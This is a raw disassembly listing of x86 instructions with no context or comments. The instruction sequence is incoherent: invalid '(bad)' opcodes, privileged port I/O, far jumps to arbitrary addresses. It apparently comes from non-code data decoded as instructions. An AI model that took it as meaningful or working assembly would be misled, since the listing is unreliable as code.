  4104c7:	cmp    ch,BYTE PTR [edi+0x10]
  4104ca:	inc    eax
  4104cb:	add    ebp,DWORD PTR [esi+0x4c]
  4104ce:	push   ebp
  4104cf:	dec    ebx
  4104d0:	jg     0x410514
  4104d2:	call   0x2d5b:0x987f6390
  4104d9:	mov    WORD PTR [ebx-0x1a],gs
  4104dc:	cmp    ebx,DWORD PTR [ecx+0x55c5c27a]
  4104e2:	sbb    ch,dh
  4104e4:	mov    bl,0x3c
  4104e6:	sahf   
  4104e7:	outs   dx,DWORD PTR ds:[esi]
  4104e8:	sub    ch,BYTE PTR [esp+edi*2+0x4c]
  4104ec:	js     0x4104dd
  4104ee:	mov    cl,0xeb
  4104f0:	pop    ebp
  4104f1:	test   BYTE PTR [esi+edx*8+0x3a],cl
  4104f5:	push   ss
  4104f6:	fld    DWORD PTR [ecx+0x5de54a5f]
  4104fc:	(bad)  
  4104fe:	sub    al,0xd9
  410500:	stos   BYTE PTR es:[edi],al
  410501:	stc    
  410502:	lods   eax,DWORD PTR ds:[esi]
  410503:	sar    DWORD PTR [edx],cl
  410505:	pop    ss
  410506:	retf   0xc3ee
  410509:	les    edx,FWORD PTR [edx-0x21]
  41050c:	shl    BYTE PTR [ecx+ecx*4+0x45905d54],0x2a
  410514:	cmp    edi,DWORD PTR [ecx+eax*8]
  410517:	xor    eax,0xf616f754
  41051c:	stos   BYTE PTR es:[edi],al
  41051d:	cdq    
  41051e:	or     al,0x3b
  410520:	mov    ah,BYTE PTR [edx-0x1b]
  410523:	mov    bh,0xfd
  410525:	mov    ebx,0x21582fd
  41052a:	xor    bh,ch
  41052c:	test   DWORD PTR [edx-0x63],esp
  41052f:	mov    ds:0xef3b1c3c,al
  410534:	popf   
  410535:	inc    edi
  410536:	das    
  410537:	ficomp WORD PTR [edx-0x62d8c108]
  41053d:	pop    ebp
  41053e:	setne  bh
  410541:	std    
  410542:	push   edx
  410543:	jae    0x410542
  410545:	jnp    0x410559
  410547:	adc    BYTE PTR [edx-0xaa12b70],ah
  41054d:	inc    eax
  41054e:	lahf   
  41054f:	imul   ecx,DWORD PTR [ebx+0xc],0xae2518d5
  410556:	enter  0xc65a,0xce
  41055a:	leave  
  41055b:	das    
  41055c:	and    eax,0xbda73dd0
  410561:	repnz mov eax,?
  410564:	push   ss
  410565:	adc    ebx,DWORD PTR [ebx-0x3e]
  410568:	lods   eax,DWORD PTR ds:[esi]
  410569:	xchg   ecx,eax
  41056a:	cdq    
  41056b:	push   edx
  41056c:	cmc    
  41056d:	mov    edx,0x89b1c622
  410572:	pop    edx
  410573:	cld    
  410574:	jbe    0x4104f9
  410576:	jne    0x410599
  410578:	push   es
  410579:	pushf  
  41057a:	cmp    edi,0xa8eec626
  410580:	mov    ecx,0x58196d41
  410585:	out    0xa,eax
  410587:	mov    BYTE PTR [esi-0x2c13c565],ch
  41058d:	loope  0x410602
  41058f:	enter  0xd5c1,0x32
  410593:	mov    eax,ds:0x463c314a
  410598:	and    eax,edx
  41059a:	jo     0x410575
  41059c:	imul   ecx,DWORD PTR [edx+0x1c4071a3],0xf6af455a
  4105a6:	push   eax
  4105a7:	pop    ecx
  4105a8:	mov    ebp,0x7f50bbd
  4105ad:	push   cs
  4105ae:	pop    ecx
  4105af:	cmp    BYTE PTR ds:0xd8f3ddda,ah
  4105b5:	sbb    DWORD PTR [esi-0x5c19ad31],0xffffffe0
  4105bc:	mov    ds:0xf7f02597,al
  4105c1:	cmc    
  4105c2:	imul   ecx,DWORD PTR [edx],0xffffffc8
  4105c5:	jo     0x4105df
  4105c7:	push   ss
  4105c8:	add    BYTE PTR [eax-0x42],bh
  4105cb:	jmp    0x26f63251
  4105d0:	in     al,dx
  4105d1:	sbb    eax,0xcfdac6e4
  4105d6:	aam    0x10
  4105d8:	push   ds
  4105d9:	jne    0x4105ee
  4105db:	mov    ecx,0xed681632
  4105e0:	jns    0x4105cd
  4105e2:	(bad)
  4105e5:	and    al,0x2d
  4105e7:	inc    ebx
  4105e8:	fild   QWORD PTR [ebx-0x10]
  4105eb:	jns    0x41057c
  4105ed:	xor    eax,0xd40be4f0
  4105f2:	and    BYTE PTR [eax-0x403447c4],bh
  4105f8:	into   
  4105f9:	mov    ebp,0xf258c165
  4105fe:	adc    cl,bh
  410600:	add    DWORD PTR [ebp-0x52156301],ebp
  410606:	call   0xecc436b9
  41060b:	jns    0x410602
  41060d:	ret    
  41060e:	cmc    
  41060f:	pop    ss
  410610:	out    dx,al
  410611:	sub    DWORD PTR [ebx],esi
  410613:	sbb    DWORD PTR [ecx+0x7de2f63e],0x62c2f4ca
  41061d:	sub    DWORD PTR [ecx],0xa7645058
  410623:	vorps  ymm2,ymm5,ymm4
  410627:	pop    ecx
  410628:	jg     0x410666
  41062a:	cmp    DWORD PTR [esi],esi
  41062c:	mov    WORD PTR [edi+0x49],gs
  41062f:	jg     0x410608
  410631:	mov    ds:0x52598674,eax
  410636:	cmp    eax,0x5aa2fea7
  41063b:	dec    edx
  41063c:	xchg   esp,eax
  41063d:	bound  ebp,QWORD PTR [eax+0xc448d02]
  410643:	dec    ebx
  410644:	loop   0x410645
  410646:	(bad)  
  410648:	mov    ebp,0x27010cbb
  41064d:	xor    esi,0x36
  410650:	add    DWORD PTR [ecx+0x7e7d79a5],ebp
  410656:	es daa 
  410658:	js     0x4106ca
  41065a:	dec    eax
  41065b:	test   BYTE PTR [ebp-0x695d6d08],dl
  410661:	les    edx,FWORD PTR [ecx+0x27]
  410664:	sub    al,0x16
  410666:	cmp    al,0x84
  410668:	(bad)  
  410669:	into   
  41066a:	xor    edi,DWORD PTR [edi-0x69]
  41066d:	push   eax
  41066e:	ret    0xc1b0
  410671:	icebp  
  410672:	fist   WORD PTR [edx+ebx*2]
  410675:	cmc    
  410676:	ss jp  0x410698
  410679:	iret   
  41067a:	cmp    al,0x2b
  41067c:	cmp    dh,BYTE PTR [eax]
  41067e:	inc    ecx
  41067f:	arpl   di,bp
  410681:	scas   eax,DWORD PTR es:[edi]
  410682:	fisubr DWORD PTR [edx]
  410684:	sbb    BYTE PTR [ebx+0x2fadabac],bl
  41068a:	push   ss
  41068b:	mov    dh,0xca
  41068d:	jne    0x4106bf
  41068f:	jno    0x41068b
  410691:	or     BYTE PTR [eax-0x2c430cde],ch
  410697:	add    cl,BYTE PTR [ecx]
  410699:	int3   
  41069a:	leave  
  41069b:	into   
  41069c:	jb     0x410674
  41069e:	test   BYTE PTR [edi-0xe],ch
  4106a1:	jmp    0x410632
  4106a3:	test   DWORD PTR [edx+0x55],edi
  4106a6:	pop    edi
  4106a7:	lahf   
  4106a8:	out    0x86,eax
  4106aa:	ja     0x410638
  4106ac:	rol    BYTE PTR [ebx+ebp*4],0x19
  4106b0:	aam    0xfd
  4106b2:	push   0xffffffdb
  4106b4:	mov    esp,0x8482b056
  4106b9:	adc    cl,BYTE PTR [esi-0x74]
  4106bc:	sbb    al,0x1f
  4106be:	or     esi,DWORD PTR [ebp+0x33]
  4106c1:	addr16 aad 0x94
  4106c4:	aam    0xe6
  4106c6:	mov    dh,0xb6
  4106c8:	fmul   st,st(1)
  4106ca:	mov    esi,0x5e2db60a
  4106cf:	aad    0x72
  4106d1:	jg     0x4106ed
  4106d3:	pop    ds
  4106d4:	xchg   bh,dh
  4106d6:	fnstsw WORD PTR [esi+0x6c8fccb4]
  4106dc:	ins    DWORD PTR es:[edi],dx
  4106dd:	mov    ecx,0x929260fa
  4106e2:	stos   BYTE PTR es:[edi],al
  4106e3:	jno    0x41072c
  4106e5:	ja     0x41072a
  4106e7:	shr    ch,cl
  4106e9:	lods   eax,DWORD PTR ds:[esi]
  4106ea:	leave  
  4106eb:	loopne 0x4106f2
  4106ed:	mov    DWORD PTR ds:0xe256d98e,ebp
  4106f3:	sub    WORD PTR [bx-0x60],di
  4106f8:	xchg   ah,ch
  4106fa:	mov    ds:0xe19d549b,eax
  4106ff:	sub    al,0xc8
  410701:	(bad)  
  410702:	push   esp
  410703:	pop    eax
  410704:	in     eax,0xb5
  410706:	pop    esp
  410707:	push   edi
  410708:	loope  0x4106aa
  41070a:	fwait
  41070b:	inc    edi
  41070c:	xchg   edi,eax
  41070d:	mov    ds:0x25407849,al
  410712:	sub    eax,DWORD PTR [edx+0x22]
  410715:	mov    dh,0x76
  410717:	adc    esp,esp
  410719:	mov    ah,0xe3
  41071b:	jno    0x4106fc
  41071d:	scas   eax,DWORD PTR es:[edi]
  41071e:	cdq    
  41071f:	sbb    al,0x94
  410721:	(bad)  
  410722:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410723:	pushf  
  410724:	and    eax,0x58a2851f
  410729:	mov    eax,0xcdc4c514
  41072e:	das    
  41072f:	sbb    DWORD PTR [edx],ebp
  410731:	xchg   esp,eax
  410732:	dec    edi
  410733:	adc    esp,DWORD PTR [eax+0x327b5b93]
  410739:	fadd   QWORD PTR [ebx+0x183795e8]
  41073f:	stc    
  410740:	fidivr DWORD PTR [ebx-0x1b]
  410743:	fidivr DWORD PTR [ebx+0x52]
  410746:	loopne 0x410798
  410748:	or     eax,0x4d521114
  41074d:	and    edi,edx
  41074f:	fiadd  DWORD PTR [edx]
  410751:	mov    ch,BYTE PTR [edx-0x5bc0268e]
  410757:	pop    edx
  410758:	retf   
  410759:	mov    eax,0x17b855ea
  41075e:	or     BYTE PTR [ecx-0x2d],al
  410761:	push   0x1e1927a8
  410766:	in     eax,0x7d
  410768:	and    dl,BYTE PTR [ebp-0x1f]
  41076b:	shl    DWORD PTR [eax+0x3c],1
  41076e:	retf   0xdda9
  410771:	xchg   edx,eax
  410772:	push   eax
  410773:	xor    eax,0x58b33756
  410778:	push   esi
  410779:	in     eax,dx
  41077a:	mov    esi,0x9bba44a7
  41077f:	mov    esp,0xb19f4138
  410784:	pop    edi
  410785:	push   ds
  410786:	mov    bl,0x3
  410788:	dec    edi
  410789:	xor    BYTE PTR [edi-0xf],ah
  41078c:	call   0x40161783
  410791:	fdiv   st(7),st
  410793:	xor    ch,BYTE PTR [esi]
  410795:	jmp    0x3127c540
  41079a:	ror    BYTE PTR [esi+0x3f142fbc],0x6d
  4107a1:	imul   edx,ebx,0x92f2b429
  4107a7:	add    dh,BYTE PTR [esi+ebp*1+0x19]
  4107ab:	cmc    
  4107ac:	out    dx,eax
  4107ad:	xor    DWORD PTR [ebp+0x70430f0e],0xffffffeb
  4107b4:	jle    0x410817
  4107b6:	ins    BYTE PTR es:[edi],dx
  4107b7:	mov    cx,0xc11b
  4107bb:	les    esi,FWORD PTR [edx+0xa0087e2]
  4107c1:	and    dh,cl
  4107c3:	cld    
  4107c4:	adc    esp,DWORD PTR [edx]
  4107c6:	mov    ebp,DWORD PTR [esp+edi*1+0x3f]
  4107ca:	cmp    DWORD PTR [ebx+0x7c44faf5],eax
  4107d0:	mov    WORD PTR [ecx+0x62f79e],?
  4107d6:	ret    
  4107d7:	out    dx,al
  4107d8:	loopne 0x410804
  4107da:	stos   BYTE PTR es:[edi],al
  4107db:	pop    ebx
  4107dc:	push   edx
  4107dd:	xchg   ebp,eax
  4107df:	xor    al,0x31
  4107e1:	or     ch,0x96
  4107e4:	push   ebp
  4107e5:	popf   
  4107e6:	dec    esi
  4107e7:	out    dx,al
  4107e8:	add    dh,BYTE PTR [eax-0x35cd8e8c]
  4107ee:	push   ecx
  4107ef:	and    al,0x27
  4107f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107f2:	inc    edx
  4107f3:	mov    al,ds:0x8bae3aee
  4107f8:	lock sub dh,BYTE PTR [eax]
  4107fb:	push   ebx
  4107fc:	mov    al,ds:0xc82fc6d2
  410801:	mov    al,ds:0x5e88e623
  410806:	shl    DWORD PTR [edi],cl
  410808:	in     al,dx
  410809:	dec    ecx
  41080a:	(bad)  
  41080b:	fcomp  DWORD PTR fs:[edi-0x5c3e25e8]
  410812:	or     al,0xee
  410814:	(bad)  
  410815:	mov    ah,0x88
  410817:	pop    ecx
  410818:	cmp    cl,BYTE PTR [ebx+0x6b336082]
  41081e:	adc    esi,0x5f4f79ef
  410824:	cdq    
  410825:	inc    edx
  410826:	cmc    
  410827:	cmp    BYTE PTR [ecx+0x9],bl
  41082a:	jmp    0xe4c24229
  41082f:	adc    dl,BYTE PTR [edi-0x5aed13e]
  410835:	(bad)  
  410836:	fidiv  DWORD PTR [esp+ebx*1-0x73918ea6]
  41083d:	pop    esi
  41083e:	or     DWORD PTR [esi+ecx*4-0x4b24b581],edx
  410845:	cwde   
  410846:	das    
  410847:	out    0x1,eax
  410849:	jle    0x410805
  41084b:	xor    edi,esi
  41084d:	enter  0xb5c7,0xc4
  410851:	xchg   ecx,eax
  410852:	sub    DWORD PTR [ebx+ebp*2+0x5a],esi
  410856:	mov    eax,esp
  410858:	pop    ss
  410859:	loopne 0x410800
  41085b:	jmp    FWORD PTR [edx+ebx*2]
  41085e:	or     eax,0x4bb2b70
  410863:	(bad)  
  410864:	stc    
  410865:	frstor [edi+0x64]
  410868:	test   al,0xbf
  41086a:	fsub   st,st(5)
  41086c:	adc    ebx,ecx
  41086e:	loope  0x4108ed
  410870:	fcomp  DWORD PTR [eax-0x64d4c368]
  410876:	inc    esp
  410877:	push   edx
  410878:	ret    0x916b
  41087b:	cmp    eax,0x2004f86a
  410880:	inc    ebx
  410881:	sub    BYTE PTR [edi+0x581610a2],al
  410887:	popa   
  410888:	dec    ecx
  410889:	sbb    ah,BYTE PTR [ecx-0xa]
  41088c:	mov    ds:0x2a1a7668,eax
  410891:	push   esp
  410892:	jl     0x4108de
  410894:	adc    dh,BYTE PTR [eax]
  410896:	fnstsw WORD PTR [edi-0x55]
  410899:	jb     0x41086c
  41089b:	fisub  DWORD PTR ss:0x20837ca5
  4108a2:	ss mov ebp,0x5116d7bf
  4108a8:	sbb    DWORD PTR ds:0x2d7a7a35,ebp
  4108ae:	aaa    
  4108af:	adc    DWORD PTR [ebp+0x61ed0127],ecx
  4108b5:	outs   dx,DWORD PTR ds:[esi]
  4108b6:	dec    ebx
  4108b7:	data16 mov ah,0x2a
  4108ba:	cmp    eax,0xe3c737ab
  4108bf:	xor    BYTE PTR [eax-0x5b],cl
  4108c2:	push   esi
  4108c3:	xchg   ecx,eax
  4108c4:	cdq    
  4108c5:	call   0x727:0x472b1864
  4108cc:	das    
  4108cd:	mov    bh,0xe1
  4108cf:	and    BYTE PTR [edi+0x16],ah
  4108d2:	dec    esi
  4108d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108d4:	inc    ebp
  4108d5:	jg     0x410927
  4108d7:	dec    ebx
  4108d8:	mov    eax,0x5ce4cfe0
  4108dd:	inc    ebx
  4108de:	inc    esi
  4108df:	das    
  4108e0:	shl    DWORD PTR [edx+0x6e9686a0],cl
  4108e6:	ret    
  4108e7:	mov    eax,ds:0x84408f14
  4108ec:	shr    DWORD PTR ds:0xcac0595,cl
  4108f2:	fidiv  WORD PTR [edx+0x23d2ab09]
  4108f8:	(bad)  
  4108f9:	aad    0xeb
  4108fb:	(bad)  
  4108fc:	call   0x8e807bd9
  410901:	call   0x3543:0xbd31f446
  410908:	mov    eax,0x39b87f4a
  41090d:	sbb    BYTE PTR [esi+ecx*2],dh
  410910:	icebp  
  410911:	fwait
  410912:	xor    ch,BYTE PTR [edx]
  410914:	shr    ecx,0x66
  410917:	mov    bl,0x96
  410919:	sbb    dl,BYTE PTR [esi-0x41]
  41091c:	mov    ecx,0xd89920a2
  410921:	sub    edx,DWORD PTR [edi-0x78e9131c]
  410927:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  410929:	push   ds
  41092a:	nop
  41092b:	mov    edi,edi
  41092d:	xchg   ebx,eax
  41092e:	aam    0x7d
  410930:	loopne 0x4108e8
  410932:	ds stc 
  410934:	cmp    al,ah
  410936:	rol    ecx,0xd4
  410939:	xchg   ecx,eax
  41093a:	lods   al,BYTE PTR ds:[esi]
  41093b:	push   esp
  41093c:	mov    esp,0x757f846a
  410941:	(bad)  
  410942:	aas    
  410943:	push   esp
  410944:	jge    0x410980
  410946:	in     eax,0xdb
  410948:	(bad)  
  410949:	cmp    edi,esi
  41094b:	xor    cl,al
  41094d:	iret   
  41094e:	arpl   WORD PTR [ebp+ebp*4+0x38f31c14],di
  410955:	std    
  410956:	pusha  
  410957:	xchg   BYTE PTR [edx+edx*2],al
  41095a:	xchg   esi,eax
  41095b:	test   BYTE PTR [eax-0x6f],0xc3
  41095f:	push   ebp
  410960:	and    al,0x77
  410962:	fiadd  DWORD PTR [esi-0x6a]
  410965:	inc    esi
  410966:	cmp    al,0xcd
  410968:	aad    0x8a
  41096a:	jle    0x4109b2
  41096c:	mov    DWORD PTR [ecx+eax*1],esp
  41096f:	iret   
  410970:	aad    0xd0
  410972:	mov    bl,0x86
  410974:	fwait
  410975:	pop    eax
  410976:	adc    al,0xc5
  410978:	adc    eax,0xa70205cf
  41097d:	pop    edi
  41097e:	mov    bl,0xd3
  410980:	inc    edi
  410981:	les    esp,FWORD PTR [eax]
  410983:	xchg   DWORD PTR [esi+eiz*4],eax
  410986:	repz jmp 0xc356:0x6e36c20
  41098e:	mov    dh,0x51
  410990:	push   0x13d5b0a7
  410995:	adc    al,0x8f
  410997:	xor    ebp,edi
  410999:	sbb    eax,0xdc8bc594
  41099e:	aad    0x6a
  4109a0:	into   
  4109a1:	mov    eax,0x9060f8a1
  4109a6:	(bad)  
  4109a7:	mov    al,0xe6
  4109a9:	add    edi,DWORD PTR [edi+0x2a]
  4109ac:	sub    esi,DWORD PTR [ebx-0x72]
  4109af:	cs ja  0x410938
  4109b2:	dec    eax
  4109b3:	gs cwde 
  4109b5:	jb     0x410a34
  4109b7:	mov    edi,esi
  4109b9:	xchg   edx,eax
  4109ba:	push   ds
  4109bb:	ror    esp,cl
  4109bd:	mov    ecx,0x81c40b9e
  4109c2:	mov    ch,ah
  4109c4:	and    ebp,edi
  4109c6:	arpl   WORD PTR [eax-0x37cd0610],bp
  4109cc:	lock mov BYTE PTR [ecx-0xb],ah
  4109d0:	jg     0x410969
  4109d2:	adc    al,0x9d
  4109d4:	ds mov bl,0x88
  4109d7:	aad    0xdf
  4109d9:	in     eax,dx
  4109da:	pushf  
  4109db:	add    edx,DWORD PTR [ebx+0x6]
  4109de:	out    0x17,eax
  4109e0:	stos   BYTE PTR es:[edi],al
  4109e1:	xor    al,dl
  4109e3:	iret   
  4109e4:	xchg   ecx,eax
  4109e5:	fiadd  WORD PTR [ecx]
  4109e7:	in     al,dx
  4109e8:	pop    ecx
  4109e9:	stos   DWORD PTR es:[edi],eax
  4109ea:	mov    bl,0x8f
  4109ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109ed:	jo     0x41097f
  4109ef:	jp     0x410995
  4109f1:	pmulhw mm0,QWORD PTR [ecx-0x5b94d15b]
  4109f8:	jbe    0x410a3d
  4109fa:	sbb    cl,BYTE PTR [ecx]
  4109fc:	stc    
  4109fd:	mov    cl,0xb6
  4109ff:	jp     0x4109d5
  410a01:	sub    eax,0x3613ecba
  410a06:	sub    cl,dl
  410a08:	sti    
  410a09:	add    al,0xf2
  410a0b:	lea    esp,[ebx]
  410a0d:	pop    es
  410a0e:	sahf   
  410a0f:	xor    BYTE PTR [edx-0x6cf51daf],al
  410a15:	shl    BYTE PTR [ebx-0x5a],1
  410a18:	pop    DWORD PTR [ebp-0x13]
  410a1b:	add    BYTE PTR [esi],bh
  410a1d:	jo     0x410a41
  410a1f:	(bad)
  410a23:	mov    eax,gs
  410a25:	les    ebx,FWORD PTR [ebp+0x69]
  410a28:	stos   DWORD PTR es:[edi],eax
  410a29:	cmp    edx,ebx
  410a2b:	cmp    edi,DWORD PTR [ebx]
  410a2d:	(bad)  
  410a2e:	or     eax,0x208dbf47
  410a33:	xchg   esp,eax
  410a34:	mov    BYTE PTR [ecx],ch
  410a36:	and    cl,BYTE PTR [esi]
  410a38:	mov    ds:0xeb3f5479,eax
  410a3d:	mov    ds:0x3bb8a98f,eax
  410a42:	scas   al,BYTE PTR es:[edi]
  410a43:	dec    eax
  410a44:	lea    ecx,[edx]
  410a46:	push   0x5f
  410a48:	leave  
  410a49:	jb     0x410a13
  410a4b:	mov    ds:0xcdbf9f57,al
  410a50:	out    0x2a,eax
  410a52:	and    edx,DWORD PTR [ebx+eax*4+0x3911c7b5]
  410a59:	push   0xffffffd3
  410a5b:	out    0x66,al
  410a5d:	jp     0x410a16
  410a5f:	imul   edi,ebp,0xd997fb93
  410a65:	repz adc ecx,DWORD PTR [esi-0x2]
  410a69:	js     0x410ad1
  410a6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a6c:	out    0x70,eax
  410a6e:	sbb    DWORD PTR [eax-0x432f70c6],edx
  410a74:	fild   WORD PTR [ebp+0x563caa09]
  410a7a:	mov    bl,0xcc
  410a7c:	dec    BYTE PTR [ecx]
  410a7e:	dec    esi
  410a7f:	adc    al,0x4a
  410a81:	xchg   esp,eax
  410a82:	and    bh,BYTE PTR [ebx]
  410a84:	dec    edi
  410a85:	test   al,0x35
  410a87:	sbb    DWORD PTR [ebx+0x3190961f],esp
  410a8d:	mov    ah,0x7b
  410a8f:	mov    bh,0x90
  410a91:	sub    BYTE PTR [ebx+0x58a88669],ah
  410a97:	outs   dx,DWORD PTR ds:[esi]
  410a98:	mov    eax,ds:0xddbf6625
  410a9d:	jbe    0x410a67
  410a9f:	mov    bh,0xac
  410aa1:	push   edi
  410aa2:	pop    ebx
  410aa3:	test   eax,0x3b33e486
  410aa8:	xor    dh,BYTE PTR [eax+ebp*1-0x22ac0d90]
  410aaf:	sub    BYTE PTR [edi+0x0],ch
  410ab2:	sbb    DWORD PTR [ebx+0x1a],0xffffffe0
  410ab6:	lsl    ecx,cx
  410ab9:	out    0x5f,al
  410abb:	cmc    
  410abc:	cmc    
  410abd:	xlat   BYTE PTR ds:[ebx]
  410abe:	xor    eax,0x71d23fce
  410ac3:	pop    esp
  410ac4:	and    BYTE PTR [edx+0x30],dh
  410ac7:	jo     0x410b2c
  410ac9:	jecxz  0x410a4b
  410acb:	sub    al,0x89
  410acd:	mov    BYTE PTR [edx],bl
  410acf:	mov    esi,0x930d6948
  410ad4:	sub    eax,0xedd2005d
  410ad9:	jmp    0x32c7:0x88454942
  410ae0:	pop    es
  410ae1:	dec    eax
  410ae2:	and    BYTE PTR [ebx-0xcf19b95],dh
  410ae8:	mov    BYTE PTR [ebp+0x773cd6e5],bh
  410aee:	divps  xmm2,XMMWORD PTR [esi+0x73]
  410af2:	inc    esi
  410af3:	outs   dx,BYTE PTR ds:[esi]
  410af4:	test   al,0x27
  410af6:	jne    0x410ad4
  410af8:	sub    ebp,DWORD PTR [esi-0x51]
  410afb:	stc    
  410afc:	or     bh,BYTE PTR [eax+0x3242ebe3]
  410b02:	icebp  
  410b03:	(bad)  
  410b04:	fucomip st,st(4)
  410b06:	icebp  
  410b07:	push   cs
  410b08:	cs jne 0x410b78
  410b0b:	mov    al,ds:0xd2f0fc21
  410b10:	test   eax,0x6cffc1b7
  410b15:	and    BYTE PTR [ecx+0x6e],ah
  410b18:	mov    ah,0x5
  410b1a:	loope  0x410ad6
  410b1c:	push   edx
  410b1d:	mov    ah,0x4b
  410b1f:	dec    esi
  410b20:	and    al,0x3
  410b22:	ins    DWORD PTR es:[edi],dx
  410b23:	push   0x58fec84a
  410b28:	cld    
  410b29:	lods   al,BYTE PTR ds:[esi]
  410b2a:	imul   edx,DWORD PTR [edx-0x5b6abe27],0x3f
  410b31:	mov    BYTE PTR [ecx],cl
  410b33:	add    eax,0x4691ce52
  410b38:	fist   DWORD PTR [ecx]
  410b3a:	lahf   
  410b3b:	pop    esi
  410b3c:	pop    ds
  410b3d:	cld    
  410b3e:	dec    ecx
  410b3f:	sub    al,0x9d
  410b41:	lahf   
  410b42:	and    ebp,ebx
  410b44:	mov    bl,0x8d
  410b46:	or     BYTE PTR [edx+0x3c],0x8a
  410b4a:	fucomip st,st(1)
  410b4c:	aad    0xea
  410b4e:	arpl   WORD PTR [eax+0x7cb01d7a],bx
  410b54:	cmp    BYTE PTR [eax-0x5f510d35],cl
  410b5a:	push   ebx
  410b5b:	mov    dl,0xfd
  410b5d:	xor    DWORD PTR [esi+0x3f],esi
  410b60:	mov    bh,0x27
  410b62:	sub    ebx,DWORD PTR [edi+0x45]
  410b65:	mov    DWORD PTR [esi+0x8],edx
  410b68:	jge    0x410b0b
  410b6a:	into   
  410b6b:	mov    ebx,0xe2efa6e2
  410b70:	cmp    DWORD PTR [edx+ebx*2+0x12],0x4000f49c
  410b78:	mov    cl,0x87
  410b7a:	pop    ds
  410b7b:	adc    DWORD PTR [esp+ebx*8],edi
  410b7e:	fstp   st(6)
  410b80:	ret    0x2465
  410b83:	fwait
  410b84:	cli    
  410b85:	into   
  410b86:	sbb    dl,0x1b
  410b89:	jo     0x410bfc
  410b8b:	iret   
  410b8c:	mov    ebx,DWORD PTR [ebp-0x7]
  410b8f:	out    dx,eax
  410b90:	push   0xffffffc7
  410b92:	dec    edx
  410b93:	cmp    ecx,DWORD PTR [ebx+eax*8-0x3517ca78]
  410b9a:	stos   DWORD PTR es:[edi],eax
  410b9b:	outs   dx,BYTE PTR ds:[esi]
  410b9c:	aad    0x41
  410b9e:	std    
  410b9f:	call   0x326dd669
  410ba4:	mov    edx,0xbc695bd5
  410ba9:	mov    dl,0x55
  410bab:	cwde   
  410bac:	bound  ebx,QWORD PTR [eax+0x5]
  410baf:	sbb    BYTE PTR [esi-0x1b],ah
  410bb2:	mov    dh,BYTE PTR [esi-0x3e6f06ed]
  410bb8:	jmp    0x67d9:0xa8ebf072
  410bbf:	cmp    DWORD PTR [edi+0x78bba3b5],0x931f7efb
  410bc9:	or     al,0x8c
  410bcb:	sbb    al,0x7b
  410bcd:	xor    eax,0xfc31d8a0
  410bd3:	scas   al,BYTE PTR es:[edi]
  410bd4:	inc    eax
  410bd5:	add    eax,0x53a8f361
  410bda:	jae    0x410b78
  410bdc:	inc    ebx
  410bdd:	push   ss
  410bde:	(bad)  
  410bdf:	into   
  410be0:	or     cl,al
  410be2:	xlat   BYTE PTR ds:[ebx]
  410be3:	pop    ds
  410be4:	(bad)  
  410be6:	mov    ds:0x8950e60e,eax
  410beb:	fnstsw WORD PTR [eax+eiz*2]
  410bee:	sbb    dl,BYTE PTR ss:[eax-0x21]
  410bf2:	sahf   
  410bf3:	add    eax,0x2d716348
  410bf8:	adc    al,0xd9
  410bfa:	xor    eax,DWORD PTR [ebp-0x5c]
  410bfd:	in     eax,dx
  410bfe:	add    DWORD PTR [esi-0x36],ebx
  410c01:	sub    dh,BYTE PTR [edx+0x7dbe6551]
  410c07:	sbb    eax,0x24b753c
  410c0c:	mov    dl,0x63
  410c0e:	cli    
  410c0f:	adc    al,0x97
  410c11:	jbe    0x410c15
  410c13:	fisttp WORD PTR [ecx-0x13]
  410c16:	push   0xffffffa5
  410c18:	pop    esi
  410c19:	and    DWORD PTR [eax-0x5417bfbf],ecx
  410c1f:	jns    0x410bb9
  410c21:	popa   
  410c22:	sub    dl,al
  410c24:	dec    ebp
  410c25:	mov    dh,0xd0
  410c27:	or     ah,BYTE PTR [ebp+0x5d]
  410c2a:	push   cs
  410c2b:	repnz mov ah,0x72
  410c2e:	jmp    0x31aea64a
  410c33:	or     ebp,esi
  410c35:	add    eax,0x1b703bef
  410c3a:	inc    ebp
  410c3b:	dec    esi
  410c3c:	sbb    ecx,DWORD PTR [eax-0x28]
  410c3f:	push   0x16690904
  410c44:	xchg   bh,dl
  410c46:	mov    dl,0x37
  410c48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c49:	push   ecx
  410c4a:	xor    edx,DWORD PTR [ebx+edi*1]
  410c4d:	out    0xa8,al
  410c4f:	sub    BYTE PTR [esi+0x570a2ba0],ah
  410c55:	mov    ch,0x37
  410c57:	and    DWORD PTR [esi],0xffffffee
  410c5a:	dec    edi
  410c5b:	add    BYTE PTR [edi-0x2c20610c],cl
  410c61:	leave  
  410c62:	test   BYTE PTR [edx+0x2a],0x1e
  410c66:	outs   dx,DWORD PTR ds:[esi]
  410c67:	or     BYTE PTR [ebp+0x4d01a3e0],ah
  410c6d:	adc    DWORD PTR [edx],edx
  410c6f:	outs   dx,DWORD PTR ds:[esi]
  410c70:	jns    0x410c72
  410c72:	(bad)  
  410c73:	rol    DWORD PTR [edx-0x34],1
  410c76:	sub    ebp,esp
  410c78:	cmp    dh,BYTE PTR [edx+0x6c206556]
  410c7e:	cmp    eax,0x7988ff8f
  410c83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c84:	xchg   esp,eax
  410c85:	ja     0x410c36
  410c87:	inc    edi
  410c88:	or     al,0xdd
  410c8a:	sbb    dl,BYTE PTR [esi+0x2c]
  410c8d:	retf   
  410c8e:	push   0x217f323c
  410c93:	ret    
  410c94:	mov    edi,0x91e519e4
  410c99:	imul   eax,DWORD PTR [esi+0x4ee9e3b2],0xffffffb6
  410ca0:	sub    dl,ch
  410ca2:	jle    0x410d1b
  410ca4:	pop    edx
  410ca5:	and    DWORD PTR [edi],esp
  410ca7:	xor    BYTE PTR [edi+0x48],ch
  410caa:	push   0xffffff85
  410cac:	fld    st(6)
  410cae:	popa   
  410caf:	and    esi,ebp
  410cb1:	test   BYTE PTR ds:0x214eed6a,dl
  410cb7:	xor    bh,0xc9
  410cba:	fcom   QWORD PTR [edi+ebx*1-0x53]
  410cbe:	rcr    ch,0x75
  410cc1:	or     BYTE PTR ds:0x906454f6,bl
  410cc7:	leave  
  410cc8:	outs   dx,BYTE PTR ds:[esi]
  410cc9:	into   
  410cca:	scas   al,BYTE PTR es:[edi]
  410ccb:	jg     0x410c78
